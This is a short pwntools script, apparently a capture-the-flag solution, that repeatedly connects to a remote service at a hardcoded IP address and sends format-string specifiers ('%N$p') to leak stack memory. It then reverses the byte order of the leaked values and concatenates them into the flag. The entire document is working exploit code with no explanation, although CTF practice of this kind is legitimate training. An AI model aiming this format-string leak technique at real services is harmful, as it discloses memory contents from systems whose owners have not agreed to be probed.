from pwn import *

context.log_level = 'info'

flag = ''

for i in range(1, 100):
    try:
        io = remote('173.255.201.51', 51337, level='warn')
        io.recvuntil("?:")
        io.sendline('%{}$p'.format(i).encode())
        io.recvuntil(b'you.. ')
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print and close
info(flag)
